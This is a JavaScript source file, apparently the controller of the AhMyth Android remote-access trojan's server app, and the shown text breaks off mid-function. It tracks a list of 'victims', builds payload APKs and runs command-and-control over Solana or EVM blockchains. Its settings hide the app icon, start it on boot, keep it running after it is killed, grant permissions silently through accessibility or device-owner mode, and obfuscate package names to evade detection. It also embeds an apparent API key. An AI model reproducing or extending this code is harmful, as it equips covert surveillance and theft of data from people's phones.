var app = angular.module('myapp', []);
const remote = require('@electron/remote');
const {
    ipcRenderer
} = require('electron');

// Handle remote module with error handling
let dialog, victimsList, shell;
try {
    dialog = remote ? remote.dialog : null;
    victimsList = remote ? remote.require('./main') : null;
    shell = remote ? remote.shell : require('electron').shell;
} catch (e) {
    console.error("Failed to load remote modules:", e);
    dialog = null;
    victimsList = null;
    shell = null;
}

var fs = require('fs-extra');
const path = require('path');
var homedir = require('node-homedir');
const {
    dirname
} = require('path');
var dir = require("path");
let ethers, crypto, bs58, Connection, Keypair, PublicKey;
try {
    const ethersLib = require('ethers');
    ethers = ethersLib.ethers || ethersLib;
    console.log('[Blockchain] ethers loaded:', !!ethers);
} catch (e) {
    console.error('[Blockchain] Failed to load ethers:', e.message);
}
try {
    crypto = require('crypto');
    console.log('[Blockchain] crypto loaded:', !!crypto);
} catch (e) {
    console.error('[Blockchain] Failed to load crypto:', e.message);
}
try {
    bs58 = require('bs58');
    console.log('[Blockchain] bs58 loaded:', !!bs58, 'has decode:', typeof bs58.decode, 'has encode:', typeof bs58.encode);
} catch (e) {
    console.error('[Blockchain] Failed to load bs58:', e.message);
}
try {
    const solanaWeb3 = require('@solana/web3.js');
    Connection = solanaWeb3.Connection;
    Keypair = solanaWeb3.Keypair;
    PublicKey = solanaWeb3.PublicKey;
    console.log('[Blockchain] @solana/web3.js loaded - Connection:', !!Connection, 'Keypair:', !!Keypair, 'PublicKey:', !!PublicKey);
} catch (e) {
    console.error('[Blockchain] Failed to load @solana/web3.js:', e.message);
}

// Ensure Java 11 is discoverable for child processes used during APK build
const DEFAULT_JAVA_HOME = process.platform === 'win32'
    ? 'C:\\Program Files\\Eclipse Adoptium\\jdk-11.0.29.7-hotspot'
    : null;
if (!process.env.JAVA_HOME && DEFAULT_JAVA_HOME && fs.existsSync(DEFAULT_JAVA_HOME)) {
    process.env.JAVA_HOME = DEFAULT_JAVA_HOME;
}
if (process.env.JAVA_HOME) {
    const javaBin = path.join(process.env.JAVA_HOME, 'bin');
    if (!process.env.PATH.toLowerCase().includes(javaBin.toLowerCase())) {
        process.env.PATH = `${javaBin};${process.env.PATH}`;
    }
}

// Fix Constants require path - use path resolution that works in Electron renderer
let CONSTANTS;
try {
    // Try relative path first (works when script is loaded as module)
    CONSTANTS = require('../Constants');
} catch (e) {
    try {
        // Fallback: resolve from app directory
        const remote = require('@electron/remote');
        if (remote && remote.app) {
            const appPath = path.resolve(remote.app.getAppPath(), 'app', 'assets', 'js', 'Constants.js');
            CONSTANTS = require(appPath);
        } else {
            // Last resort: try resolving from known structure
            const constantsPath = path.resolve(__dirname || process.cwd(), 'app', 'assets', 'js', 'Constants.js');
            CONSTANTS = require(constantsPath);
        }
    } catch (e2) {
        console.error('Failed to load Constants:', e2);
        // Create a minimal fallback to prevent complete failure
        CONSTANTS = {
            apkName: 'Ahmyth.apk',
            signedApkName: 'Ahmyth-aligned-debugSigned.apk',
            logStatus: { SUCCESS: 1, FAIL: 0, INFO: 2, WARNING: 3 },
            logColors: { RED: "red", GREEN: "lime", ORANGE: "orange", YELLOW: "yellow", DEFAULT: "#82eefd" },
            defaultPort: 1234,
            dataDir: 'AhMyth',
            downloadPath: 'Downloads',
            outputApkPath: 'Output'
        };
    }
}
const {
    promisify
} = require('util');
const { exec: execCallback } = require('child_process');
const exec = promisify(execCallback);
var xml2js = require('xml2js');
var readdirp = require('readdirp');
//--------------------------------------------------------------
var viclist = {};
var dataPath = dir.join(homedir(), CONSTANTS.dataDir);
var downloadsPath = dir.join(dataPath, CONSTANTS.downloadPath);
var outputPath = dir.join(dataPath, CONSTANTS.outputApkPath);
var logPath = dir.join(dataPath, CONSTANTS.outputLogsPath);

// Ensure output directory exists
if (!fs.existsSync(outputPath)) {
    fs.mkdirpSync(outputPath);
}
//--------------------------------------------------------------

const specialCountryIcons = {
    local: { type: 'icon', value: 'home', title: 'Local Network' },
    lan: { type: 'icon', value: 'linkify', title: 'LAN' },
    bc: { type: 'icon', value: 'linkify', title: 'Blockchain' },
    blockchain: { type: 'icon', value: 'linkify', title: 'Blockchain' }
};

// Country code to flag image (using flagcdn.com for reliable rendering on all OS)
const countryCodeToFlag = (countryCode) => {
    if (!countryCode) return { type: 'icon', value: 'globe', title: 'Unknown' };
    const cc = countryCode.toLowerCase();
    const special = specialCountryIcons[cc];
    if (special) return special;
    // Validate country code (must be 2 letters)
    if (!/^[a-z]{2}$/i.test(cc)) return { type: 'icon', value: 'globe', title: 'Unknown' };
    // Return flag image URL
    return { 
        type: 'flag', 
        value: `https://flagcdn.com/24x18/${cc}.png`,
        value2x: `https://flagcdn.com/48x36/${cc}.png`,
        title: cc.toUpperCase()
    };
};

const markBlockchainCountry = (victim) => {
    if (!victim) return;
    const connectionType = (victim.connectionType || '').toLowerCase();
    const conn = (victim.conn || '').toLowerCase();
    const ipLabel = (victim.ip || '').toLowerCase().trim();
    const isBlockchain = !!(
        victim.isBlockchain ||
        connectionType === 'blockchain' ||
        conn === 'blockchain' ||
        ipLabel === 'blockchain' ||
        ipLabel.startsWith('blockchain')
    );
    if (isBlockchain) {
        victim.country = 'blockchain';
    }
};

// Legacy emoji function (kept for compatibility)
const countryCodeToEmoji = (countryCode) => {
    if (!countryCode) return '🌐';
    const cc = countryCode.toUpperCase();
    if (cc === 'LOCAL') return '🏠';
    if (cc === 'LAN') return '🔗';
    if (!/^[A-Z]{2}$/.test(cc)) return '🌐';
    const chars = [...cc].map(c => String.fromCodePoint(0x1F1A5 + c.charCodeAt(0)));
    return chars.join('');
};

// App Controller for (index.html)
app.controller("AppCtrl", ($scope, $sce) => {
    $appCtrl = $scope;
    $appCtrl.victims = viclist;
    $appCtrl.isVictimSelected = true;
    $appCtrl.bindApk = {
        enable: false, method: 'BOOT'
    }; //default values for binding apk
    window.connectionModes = { tcp: true, blockchain: true };
    $appCtrl.blockchainLogs = '';
    $appCtrl.autoScrollBlockchainLogs = true;

    // Dashboard/Settings properties
    $appCtrl.platform = process.platform === 'win32' ? 'Windows' : process.platform === 'darwin' ? 'macOS' : 'Linux';
    $appCtrl.outputPath = outputPath;
    $appCtrl.downloadsPath = downloadsPath;
    $appCtrl.builtPayloads = [];
    $appCtrl.defaultPort = CONSTANTS.defaultPort || 42474;
    $appCtrl.port = $appCtrl.defaultPort;
    $appCtrl.showNotifications = true;
    $appCtrl.playSoundOnVictim = false;
    $appCtrl.autoStartServer = false;
    
    // APK Builder properties
    $appCtrl.connectionType = 'tcp';
    $appCtrl.srcIP = '192.168.0.227';
    $appCtrl.srcPort = 1234;
    
    // Stealth configuration options
    $appCtrl.stealthOptions = {
        hideIcon: true,           // Hide app icon from launcher
        hideFromRecents: true,    // Exclude from recent apps
        startOnBoot: true,        // Auto-start on boot
        silentNotification: true, // Use minimal notification
        persistentService: true,  // Auto-restart if killed
        wakelock: true           // Keep CPU wake lock
    };

    // Silent permissions options
    $appCtrl.silentPermOptions = {
        generateAdbScript: true,   // Generate ADB script to grant permissions
        skipPrompts: false,        // Skip permission prompts (request silently)
        useAccessibility: false,   // Use accessibility service to auto-grant
        deviceOwner: false         // Enable device owner mode
    };

    // Obfuscation options
    $appCtrl.obfuscationOptions = {
        randomizePackage: true,    // Generate random package name
        randomizeAppName: true,    // Generate random app name
        injectJunk: true,          // Inject junk classes
        randomizeVersion: true,    // Random version code
        addMetadata: true,         // Add random metadata files
        modifySignature: true,     // Unique build signature
        customPackage: '',         // Custom package name (optional)
        customAppName: ''          // Custom app name (optional)
    };
    
    // Blockchain C2 configuration
    $appCtrl.blockchainC2Enabled = false;
    $appCtrl.blockchainListening = false;
    const DEFAULT_SOLANA_RPC = process.env.SOLANA_RPC_URL || process.env.BLOCKCHAIN_RPC_URL || 'https://api.devnet.solana.com';
    const DEFAULT_ALCHEMY_SOL = process.env.SOLANA_ALCHEMY_KEY || process.env.ALCHEMY_API_KEY || process.env.SOLANA_ALCHEMY_API_KEY || 'iYpa8brgKRSbCQ9rb1tx8';
    $appCtrl.blockchainChain = 'solana'; // tcp | blockchain (evm/solana)
    $appCtrl.blockchainC2RpcUrl = DEFAULT_SOLANA_RPC;
    $appCtrl.blockchainC2Contract = '';
    $appCtrl.blockchainC2BlockStep = 10;
    $appCtrl.blockchainC2Candidates = 5;
    $appCtrl.blockchainC2AesKey = process.env.BLOCKCHAIN_C2_AES_KEY || '';
    $appCtrl.blockchainOperatorPrivateKey = process.env.BLOCKCHAIN_PRIVATE_KEY || process.env.SOLANA_OPERATOR_PRIVATE_KEY || '';
    $appCtrl.blockchainClientPrivateKey = process.env.BLOCKCHAIN_CLIENT_PRIVATE_KEY || process.env.SOLANA_CLIENT_PRIVATE_KEY || '';
    $appCtrl.blockchainOperatorAddress = '';
    $appCtrl.blockchainClientAddress = '';
    $appCtrl.blockchainChannelBalance = '';
    $appCtrl.blockchainOperatorBalance = '';
    $appCtrl.blockchainClientBalance = '';
    $appCtrl.blockchainRpcFallbacks = [
        DEFAULT_SOLANA_RPC,
        `https://solana-devnet.g.alchemy.com/v2/${DEFAULT_ALCHEMY_SOL}`,
        'https://api.devnet.solana.com'
    ].filter(Boolean).join(', ');
    $appCtrl.blockchainRpcUrl = $appCtrl.blockchainC2RpcUrl;
    $appCtrl.blockchainContract = $appCtrl.blockchainC2Contract;
    
    // Robust path resolution using Electron remote
    let projectRoot = '';
    try {
        const appPath = remote.app.getAppPath(); // .../AhMyth-Server/app
        projectRoot = path.resolve(appPath, '..', '..'); // .../AhMyth
    } catch (e) {
        // Fallback for dev/test environment
        projectRoot = path.resolve(__dirname, '..', '..', '..', '..', '..', '..');
    }

    const blockchainKeysEnvPath = path.join(projectRoot, '.blockchain-keys.env');
    const blockchainContractEnvPath = path.join(projectRoot, '.blockchain-contract.env');
    
    // Load blockchain C2 config on init
    try {
        const blockchainConfigPath = path.join(__dirname, '..', '..', 'config', 'blockchain_c2.json');
        if (fs.existsSync(blockchainConfigPath)) {
            const config = JSON.parse(fs.readFileSync(blockchainConfigPath, 'utf8'));
            $appCtrl.blockchainC2Enabled = config.enabled || false;
            $appCtrl.blockchainC2RpcUrl = config.rpc_url || '';
            $appCtrl.blockchainC2Contract = config.contract_address || '0x0000000000000000000000000000000000000000';
            $appCtrl.blockchainC2BlockStep = config.block_step || 10;
            $appCtrl.blockchainC2Candidates = config.candidates_per_cycle || 5;
            // AES key should come from environment variable, not config file
            $appCtrl.blockchainC2AesKey = process.env.BLOCKCHAIN_C2_AES_KEY || '';
            $appCtrl.blockchainContract = $appCtrl.blockchainC2Contract;
        }
    } catch (e) {
        console.error('Failed to load blockchain C2 config:', e);
    }
    
    // Save blockchain C2 configuration
    $appCtrl.saveBlockchainC2Config = () => {
        try {
            const blockchainConfigPath = path.join(__dirname, '..', '..', 'config', 'blockchain_c2.json');
            const config = {
                enabled: $appCtrl.blockchainC2Enabled,
                rpc_url: $appCtrl.blockchainC2RpcUrl,
                contract_address: $appCtrl.blockchainC2Contract,
                block_step: $appCtrl.blockchainC2BlockStep,
                candidates_per_cycle: $appCtrl.blockchainC2Candidates,
                aes_key_env: 'BLOCKCHAIN_C2_AES_KEY',
                fallback_config_path: 'config/c2_fallback.json'
            };
            fs.ensureDirSync(path.dirname(blockchainConfigPath));
            fs.writeFileSync(blockchainConfigPath, JSON.stringify(config, null, 2), 'utf8');
            $appCtrl.Log('[✓] Blockchain C2 configuration saved', CONSTANTS.logStatus.SUCCESS);
        } catch (e) {
            $appCtrl.Log(`[✗] Failed to save blockchain C2 config: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };
    
    $appCtrl.blockchainLogs = '';
    $appCtrl.autoScrollBlockchainLogs = true;
    $appCtrl.appendBlockchainLog = (line) => {
        $appCtrl.blockchainLogs = ($appCtrl.blockchainLogs || '') + line + '\n';
        if ($appCtrl.autoScrollBlockchainLogs && typeof document !== 'undefined') {
            const el = document.getElementById('blockchainLogs');
            if (el) {
                el.scrollTop = el.scrollHeight;
            }
        }
        if ($scope && !$scope.$$phase) $scope.$applyAsync();
    };
    $appCtrl.clearBlockchainLogs = () => {
        $appCtrl.blockchainLogs = '';
    };
    $appCtrl.toggleBlockchainAutoScroll = () => {
        $appCtrl.autoScrollBlockchainLogs = !$appCtrl.autoScrollBlockchainLogs;
    };
    
    function parseEnvFile(filePath) {
        if (!fs.existsSync(filePath)) return {};
        return fs.readFileSync(filePath, 'utf8')
            .split(/\r?\n/)
            .reduce((acc, line) => {
                const match = line.trim().match(/^([^=#]+)=(.*)$/);
                if (match) {
                    acc[match[1].trim()] = match[2].trim();
                }
                return acc;
            }, {});
    }

    const detectChainFromKey = (key) => {
        if (!key) return null;
        const trimmed = key.trim();
        if (/^0x[0-9a-fA-F]{64}$/.test(trimmed)) return 'evm';
        try {
            if (!bs58 || typeof bs58.decode !== 'function') {
                console.warn('[detectChainFromKey] bs58.decode not available');
                return null;
            }
            const decoded = bs58.decode(trimmed);
            if (decoded.length === 64) return 'solana';
        } catch (e) {
            console.warn('[detectChainFromKey] bs58 decode error:', e.message);
        }
        return null;
    };
    
    const deriveSolanaAddress = (secret) => {
        try {
            if (!bs58 || typeof bs58.decode !== 'function') {
                console.error('[deriveSolanaAddress] bs58.decode not available');
                return null;
            }
            const trimmed = secret.trim();
            console.log('[deriveSolanaAddress] Input length:', trimmed.length);
            const bytes = bs58.decode(trimmed);
            console.log('[deriveSolanaAddress] Decoded bytes length:', bytes.length);
            if (bytes.length !== 64) {
                console.warn('[deriveSolanaAddress] Expected 64 bytes, got:', bytes.length);
                return null;
            }
            const pubKeyBytes = bytes.slice(32);
            const address = bs58.encode(pubKeyBytes);
            console.log('[deriveSolanaAddress] Derived address:', address);
            return address;
        } catch (e) {
            console.error('[deriveSolanaAddress] Error:', e.message);
            return null;
        }
    };
    
    function updateBlockchainAddresses() {
        if (!ethers || !bs58) {
            console.warn('[updateBlockchainAddresses] Missing ethers or bs58:', { ethers: !!ethers, bs58: !!bs58 });
            return; // Exit if critical dependencies are missing
        }
        const chain = detectChainFromKey($appCtrl.blockchainOperatorPrivateKey) ||
            detectChainFromKey($appCtrl.blockchainClientPrivateKey) ||
            $appCtrl.blockchainChain ||
            'solana';
        $appCtrl.blockchainChain = chain;
        $appCtrl.blockchainOperatorAddress = '';
        $appCtrl.blockchainClientAddress = '';
        
        console.log('[updateBlockchainAddresses] Chain:', chain, 'OpKey:', $appCtrl.blockchainOperatorPrivateKey ? 'set' : 'empty', 'ClientKey:', $appCtrl.blockchainClientPrivateKey ? 'set' : 'empty');
        
        if (chain === 'evm') {
            try {
                if ($appCtrl.blockchainOperatorPrivateKey) {
                    $appCtrl.blockchainOperatorAddress = new ethers.Wallet($appCtrl.blockchainOperatorPrivateKey).address;
                    console.log('[updateBlockchainAddresses] EVM Operator address:', $appCtrl.blockchainOperatorAddress);
                }
            } catch (e) {
                console.error('[updateBlockchainAddresses] EVM Operator key error:', e.message);
                $appCtrl.blockchainOperatorAddress = '';
            }
            try {
                if ($appCtrl.blockchainClientPrivateKey) {
                    $appCtrl.blockchainClientAddress = new ethers.Wallet($appCtrl.blockchainClientPrivateKey).address;
                    console.log('[updateBlockchainAddresses] EVM Client address:', $appCtrl.blockchainClientAddress);
                }
            } catch (e) {
                console.error('[updateBlockchainAddresses] EVM Client key error:', e.message);
                $appCtrl.blockchainClientAddress = '';
            }
        } else {
            // Solana
            if ($appCtrl.blockchainOperatorPrivateKey) {
                const opAddr = deriveSolanaAddress($appCtrl.blockchainOperatorPrivateKey);
                $appCtrl.blockchainOperatorAddress = opAddr || '';
                console.log('[updateBlockchainAddresses] Solana Operator address:', opAddr || 'derivation failed');
            }
            if ($appCtrl.blockchainClientPrivateKey) {
                const clientAddr = deriveSolanaAddress($appCtrl.blockchainClientPrivateKey);
                $appCtrl.blockchainClientAddress = clientAddr || '';
                console.log('[updateBlockchainAddresses] Solana Client address:', clientAddr || 'derivation failed');
            }
        }
        console.log('[updateBlockchainAddresses] Final addresses - Op:', $appCtrl.blockchainOperatorAddress, 'Client:', $appCtrl.blockchainClientAddress);
    }
    
    async function getUiRpcProvider(chainOverride) {
        if (!ethers || !Connection) {
            $appCtrl.Log('[✗] Cannot get RPC provider: Missing ethers or Solana Connection library', CONSTANTS.logStatus.FAIL);
            throw new Error('Missing blockchain RPC provider dependencies'); // Throw to propagate error
        }
        const chain = chainOverride || $appCtrl.blockchainChain || detectChainFromKey($appCtrl.blockchainOperatorPrivateKey) || 'solana';
        if (chain === 'evm') {
            let lastEvmError; // Track last EVM error
            const primary = ($appCtrl.blockchainRpcUrl || process.env.BLOCKCHAIN_RPC_URL || 'https://ethereum-sepolia-rpc.publicnode.com').trim();
            const extras = ($appCtrl.blockchainRpcFallbacks || '').split(',').map(s => s.trim()).filter(Boolean);
            const defaults = [
                'https://ethereum-sepolia-rpc.publicnode.com',
                'https://rpc.sepolia.org',
                'https://ethereum-sepolia.blockpi.network/v1/rpc/public'
            ];
            const candidates = [...new Set([primary, ...extras, ...defaults])];
            if (process.env.INFURA_PROJECT_ID) {
                candidates.push(`https://sepolia.infura.io/v3/${process.env.INFURA_PROJECT_ID}`);
            }
            
            for (const rpcUrl of candidates) {
                try {
                    const provider = new ethers.JsonRpcProvider(rpcUrl, { name: 'sepolia', chainId: 11155111 }, { staticNetwork: true });
                    await provider.getBlockNumber();
                    $appCtrl.Log(`[ℹ] EVM RPC connected: ${rpcUrl}`, CONSTANTS.logStatus.INFO); // Added logging
                    return { provider, rpcUrl, chain: 'evm' };
                } catch (err) {
                    $appCtrl.Log(`[⚠] EVM RPC failed (${rpcUrl}): ${err.message}`, CONSTANTS.logStatus.WARNING); // Added logging
                    lastEvmError = err; // Store last error for full failure
                    continue;
                }
            }
            throw lastEvmError || new Error('All EVM RPC endpoints failed'); // Throw last error or generic
        }
        
        let lastSolanaError; // Track last Solana error
        const primary = ($appCtrl.blockchainRpcUrl || process.env.SOLANA_RPC_URL || process.env.BLOCKCHAIN_RPC_URL || 'https://api.devnet.solana.com').trim();
        const extras = ($appCtrl.blockchainRpcFallbacks || '').split(',').map(s => s.trim()).filter(Boolean);
        const defaults = [
            `https://solana-devnet.g.alchemy.com/v2/${DEFAULT_ALCHEMY_SOL}`,
            'https://api.devnet.solana.com'
        ];
        const candidates = [...new Set([primary, ...extras, ...defaults])];
        for (const rpcUrl of candidates) {
            try {
                const provider = new Connection(rpcUrl, 'confirmed');
                await provider.getLatestBlockhash('confirmed');
                $appCtrl.Log(`[ℹ] Solana RPC connected: ${rpcUrl}`, CONSTANTS.logStatus.INFO); // Added logging
                return { provider, rpcUrl, chain: 'solana' };
            } catch (err) {
                $appCtrl.Log(`[⚠] Solana RPC failed (${rpcUrl}): ${err.message}`, CONSTANTS.logStatus.WARNING); // Added logging
                lastSolanaError = err; // Store last error for full failure
                continue;
            }
        }
        throw lastSolanaError || new Error('All Solana RPC endpoints failed');
    }
    
    $appCtrl.generateAesKey = () => {
        if (!crypto) {
            $appCtrl.Log('[✗] Cannot generate AES key: Missing crypto library', CONSTANTS.logStatus.FAIL);
            return;
        }
        $appCtrl.blockchainC2AesKey = crypto.randomBytes(32).toString('hex');
        $scope.$applyAsync();
        $appCtrl.Log('[✓] Generated new AES-256 key', CONSTANTS.logStatus.SUCCESS);
    };
    
    $appCtrl.generateClientKey = () => {
        if (!crypto || !bs58 || !Keypair) {
            $appCtrl.Log('[✗] Cannot generate client key: Missing crypto, bs58, or Keypair library', CONSTANTS.logStatus.FAIL);
            return;
        }
            const kp = Keypair.generate();
            $appCtrl.blockchainClientPrivateKey = bs58.encode(kp.secretKey);
        updateBlockchainAddresses();
        $scope.$applyAsync();
        $appCtrl.Log('[✓] Generated new client private key (fund before use)', CONSTANTS.logStatus.SUCCESS);
    };
    
    $appCtrl.generateOperatorKey = () => {
        if (!crypto || !bs58 || !Keypair) {
            $appCtrl.Log('[✗] Cannot generate operator key: Missing crypto, bs58, or Keypair library', CONSTANTS.logStatus.FAIL);
            return;
        }
            const kp = Keypair.generate();
            $appCtrl.blockchainOperatorPrivateKey = bs58.encode(kp.secretKey);
        updateBlockchainAddresses();
        $scope.$applyAsync();
        $appCtrl.Log('[✓] Generated new operator private key', CONSTANTS.logStatus.SUCCESS);
    };
    
    $appCtrl.loadBlockchainKeys = () => {
        try {
            const env = parseEnvFile(blockchainKeysEnvPath);
            if (env.SOLANA_RPC_URL || env.BLOCKCHAIN_RPC_URL) {
                $appCtrl.blockchainRpcUrl = env.SOLANA_RPC_URL || env.BLOCKCHAIN_RPC_URL;
            }
            if (env.BLOCKCHAIN_C2_AES_KEY) $appCtrl.blockchainC2AesKey = env.BLOCKCHAIN_C2_AES_KEY;
            if (env.BLOCKCHAIN_PRIVATE_KEY) $appCtrl.blockchainOperatorPrivateKey = env.BLOCKCHAIN_PRIVATE_KEY;
            if (env.BLOCKCHAIN_CLIENT_PRIVATE_KEY) $appCtrl.blockchainClientPrivateKey = env.BLOCKCHAIN_CLIENT_PRIVATE_KEY;
            if (env.BLOCKCHAIN_RPC_FALLBACKS) $appCtrl.blockchainRpcFallbacks = env.BLOCKCHAIN_RPC_FALLBACKS;
            const contractEnv = parseEnvFile(blockchainContractEnvPath);
            if (contractEnv.BLOCKCHAIN_CONTRACT_ADDRESS) {
                $appCtrl.blockchainC2Contract = contractEnv.BLOCKCHAIN_CONTRACT_ADDRESS;
                $appCtrl.blockchainContract = contractEnv.BLOCKCHAIN_CONTRACT_ADDRESS;
            } else if (contractEnv.CONTRACT_ADDRESS) {
                // Legacy support for CONTRACT_ADDRESS
                $appCtrl.blockchainC2Contract = contractEnv.CONTRACT_ADDRESS;
                $appCtrl.blockchainContract = contractEnv.CONTRACT_ADDRESS;
            }
            const detectedChain = detectChainFromKey($appCtrl.blockchainOperatorPrivateKey) || detectChainFromKey($appCtrl.blockchainClientPrivateKey);
            if (detectedChain) {
                $appCtrl.blockchainChain = detectedChain;
            }
            updateBlockchainAddresses();
            if ($appCtrl.blockchainOperatorAddress || $appCtrl.blockchainClientAddress || $appCtrl.blockchainContract) {
                $appCtrl.refreshBlockchainBalances();
            } else {
                $appCtrl.Log('[ℹ] Blockchain addresses not set; balances will remain N/A until keys/contract are provided.', CONSTANTS.logStatus.INFO);
            }
            if ($scope && $scope.$applyAsync) {
                $scope.$applyAsync();
            }
            if ($appCtrl.Log) {
                $appCtrl.Log(`[✓] Loaded blockchain keys and contract from ${blockchainKeysEnvPath} and ${blockchainContractEnvPath}`, CONSTANTS.logStatus.SUCCESS);
            } else {
                console.log(`[✓] Loaded blockchain keys and contract from ${blockchainKeysEnvPath} and ${blockchainContractEnvPath}`);
            }
        } catch (e) {
            if ($appCtrl.Log) {
                $appCtrl.Log(`[✗] Failed to load blockchain keys: ${e.message}. Attempted to read from ${blockchainKeysEnvPath} and ${blockchainContractEnvPath}`, CONSTANTS.logStatus.FAIL);
            } else {
                console.error(`Failed to load blockchain keys: ${e.message}`);
            }
        }
    };
    
    $appCtrl.saveBlockchainKeys = () => {
        try {
            const lines = [];
            if ($appCtrl.blockchainOperatorPrivateKey) lines.push(`BLOCKCHAIN_PRIVATE_KEY=${$appCtrl.blockchainOperatorPrivateKey}`);
            if ($appCtrl.blockchainClientPrivateKey) lines.push(`BLOCKCHAIN_CLIENT_PRIVATE_KEY=${$appCtrl.blockchainClientPrivateKey}`);
            if ($appCtrl.blockchainC2AesKey) lines.push(`BLOCKCHAIN_C2_AES_KEY=${$appCtrl.blockchainC2AesKey}`);
            if ($appCtrl.blockchainRpcUrl) {
                lines.push(`BLOCKCHAIN_RPC_URL=${$appCtrl.blockchainRpcUrl}`);
                lines.push(`SOLANA_RPC_URL=${$appCtrl.blockchainRpcUrl}`);
            }
            if ($appCtrl.blockchainRpcFallbacks) lines.push(`BLOCKCHAIN_RPC_FALLBACKS=${$appCtrl.blockchainRpcFallbacks}`);
            
            // Ensure projectRoot is defined before using it
            let keysPath = blockchainKeysEnvPath;
            if (!keysPath) {
                 const appPath = remote.app.getAppPath();
                 const projectRoot = path.resolve(appPath, '..', '..');
                 keysPath = path.join(projectRoot, '.blockchain-keys.env');
            }
            
            fs.writeFileSync(keysPath, lines.join('\n'), 'utf8');
            
            if ($appCtrl.blockchainContract) {
                let contractPath = blockchainContractEnvPath;
                if (!contractPath) {
                     const appPath = remote.app.getAppPath();
                     const projectRoot = path.resolve(appPath, '..', '..');
                     contractPath = path.join(projectRoot, '.blockchain-contract.env');
                }
                fs.writeFileSync(contractPath, `BLOCKCHAIN_CONTRACT_ADDRESS=${$appCtrl.blockchainContract}`, 'utf8');
            }
            $appCtrl.Log(`[✓] Saved blockchain keys/config to ${keysPath}`, CONSTANTS.logStatus.SUCCESS);
        } catch (e) {
            $appCtrl.Log(`[✗] Failed to save blockchain keys: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };
    
    $appCtrl.refreshBlockchainBalances = async () => {
        if (!ethers || !Connection || !PublicKey) {
            $appCtrl.Log('[✗] Cannot refresh balances: Missing ethers, Solana Connection, or PublicKey library', CONSTANTS.logStatus.FAIL);
            return;
        }
        
        // Ensure addresses are up to date before fetching balances
        updateBlockchainAddresses();
        
        console.log('[refreshBlockchainBalances] Fetching balances for:', {
            operator: $appCtrl.blockchainOperatorAddress,
            client: $appCtrl.blockchainClientAddress,
            channel: $appCtrl.blockchainContract
        });
        
        try {
            $appCtrl.blockchainBalanceLoading = true;
            const { provider, chain } = await getUiRpcProvider();
            console.log('[refreshBlockchainBalances] Provider chain:', chain);
            
            if (chain === 'evm') {
                const format = (val) => `${parseFloat(ethers.formatEther(val)).toFixed(6)} ETH`;
                if ($appCtrl.blockchainOperatorAddress) {
                    const bal = await provider.getBalance($appCtrl.blockchainOperatorAddress);
                    $appCtrl.blockchainOperatorBalance = format(bal);
                    console.log('[refreshBlockchainBalances] EVM Operator balance:', $appCtrl.blockchainOperatorBalance);
                } else {
                    $appCtrl.blockchainOperatorBalance = 'N/A';
                    $appCtrl.Log('[ℹ] No operator address set; skipping operator balance', CONSTANTS.logStatus.INFO);
                }
                if ($appCtrl.blockchainClientAddress) {
                    const bal = await provider.getBalance($appCtrl.blockchainClientAddress);
                    $appCtrl.blockchainClientBalance = format(bal);
                    console.log('[refreshBlockchainBalances] EVM Client balance:', $appCtrl.blockchainClientBalance);
                } else {
                    $appCtrl.blockchainClientBalance = 'N/A';
                    $appCtrl.Log('[ℹ] No client address set; skipping client balance', CONSTANTS.logStatus.INFO);
                }
            } else {
                // Solana
                const formatSol = (lamports) => `${(lamports / 1_000_000_000).toFixed(6)} SOL`;
                if ($appCtrl.blockchainOperatorAddress) {
                    try {
                        const bal = await provider.getBalance(new PublicKey($appCtrl.blockchainOperatorAddress), 'confirmed');
                        $appCtrl.blockchainOperatorBalance = formatSol(bal);
                        console.log('[refreshBlockchainBalances] Solana Operator balance:', $appCtrl.blockchainOperatorBalance);
                    } catch (e) {
                        console.error('[refreshBlockchainBalances] Operator balance error:', e.message);
                        $appCtrl.blockchainOperatorBalance = 'Error';
                    }
                } else {
                    $appCtrl.blockchainOperatorBalance = 'N/A';
                    $appCtrl.Log('[ℹ] No operator address set; skipping operator balance', CONSTANTS.logStatus.INFO);
                }
                if ($appCtrl.blockchainClientAddress) {
                    try {
                        const bal = await provider.getBalance(new PublicKey($appCtrl.blockchainClientAddress), 'confirmed');
                        $appCtrl.blockchainClientBalance = formatSol(bal);
                        console.log('[refreshBlockchainBalances] Solana Client balance:', $appCtrl.blockchainClientBalance);
                    } catch (e) {
                        console.error('[refreshBlockchainBalances] Client balance error:', e.message);
                        $appCtrl.blockchainClientBalance = 'Error';
                    }
                } else {
                    $appCtrl.blockchainClientBalance = 'N/A';
                    $appCtrl.Log('[ℹ] No client address set; skipping client balance', CONSTANTS.logStatus.INFO);
                }
                if ($appCtrl.blockchainContract) {
                    try {
                        const bal = await provider.getBalance(new PublicKey($appCtrl.blockchainContract), 'confirmed');
                        $appCtrl.blockchainChannelBalance = formatSol(bal);
                        console.log('[refreshBlockchainBalances] Channel balance:', $appCtrl.blockchainChannelBalance);
                    } catch (e) {
                        console.error('[refreshBlockchainBalances] Channel balance error:', e.message);
                        $appCtrl.blockchainChannelBalance = 'Error';
                    }
                } else {
                    $appCtrl.Log('[ℹ] No channel/contract address set; skipping channel balance', CONSTANTS.logStatus.INFO);
                }
            }
            $scope.$applyAsync();
            $appCtrl.Log('[✓] Updated blockchain balances', CONSTANTS.logStatus.SUCCESS);
        } catch (e) {
            console.error('[refreshBlockchainBalances] Error:', e);
            $appCtrl.Log(`[✗] Balance check failed: ${e.message}`, CONSTANTS.logStatus.FAIL);
        } finally {
            $appCtrl.blockchainBalanceLoading = false;
            $scope.$applyAsync();
        }
    };
    
    $appCtrl.deployBlockchainContract = async () => {
        if (!ethers || !exec || !fs || !path) {
            $appCtrl.Log('[✗] Cannot deploy contract: Missing ethers, exec, fs, or path library', CONSTANTS.logStatus.FAIL);
            return;
        }
        if (($appCtrl.blockchainChain || 'solana') === 'solana') {
            $appCtrl.Log('[ℹ] Solana uses a pre-funded channel; set BLOCKCHAIN_CONTRACT_ADDRESS to your channel pubkey.', CONSTANTS.logStatus.INFO);
            return;
        }
        try {
            const rpcToUse = ($appCtrl.blockchainRpcUrl || process.env.BLOCKCHAIN_RPC_URL || 'https://ethereum-sepolia-rpc.publicnode.com').trim();
            const opKey = ($appCtrl.blockchainOperatorPrivateKey || process.env.BLOCKCHAIN_PRIVATE_KEY || '').trim();
            if (!opKey) {
                $appCtrl.Log('[✗] Operator private key required to deploy contract', CONSTANTS.logStatus.FAIL);
                return;
            }
            $appCtrl.Log('[→] Deploying contract via deploy-free-contract.js...', CONSTANTS.logStatus.INFO);
            
            let deployScriptPath = path.join(projectRoot, 'deploy-free-contract.js');
